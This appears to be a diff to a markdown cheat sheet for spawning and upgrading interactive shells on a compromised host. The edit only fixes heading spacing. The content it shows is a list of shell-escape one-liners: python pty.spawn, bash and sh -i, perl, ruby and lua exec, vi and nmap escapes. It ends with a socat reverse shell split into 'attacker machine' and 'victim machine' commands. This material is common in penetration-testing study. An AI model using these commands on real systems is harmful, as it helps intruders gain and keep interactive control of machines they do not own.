@@ -4,53 +4,53 @@
 
 check if the shell is tty   by typing  **tty**
 
-##python
+## python
 
     python -c 'import pty; pty.spawn("/bin/sh")'
 
     python3 -c 'import pty; pty.spawn("/bin/sh")'
 
-##echo
+## echo
 
     echo os.system('/bin/bash')
 
-##bash
+## bash
 
     /bin/bash -i
 
-##sh
+## sh
 
     /bin/sh -i
 
-##perl
+## perl
 
     perl —e 'exec "/bin/sh";'
 
     perl: exec "/bin/sh";
 
-##ruby
+## ruby
 
     ruby: exec "/bin/sh"
 
-##lua
+## lua
 
     lua: os.execute('/bin/sh')
 
-##IRB
+## IRB
 
     exec "/bin/sh"
 
-##vi
+## vi
 
     :!bash
 
     :set shell=/bin/bash:shell
 
-##nmap
+## nmap
 
     !sh
 
-##socat
+## socat
 
     on attacker machine : socat -,raw,echo=0 tcp-listen:<port> 
     on victim mahcine   : socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<ip>:<port>  
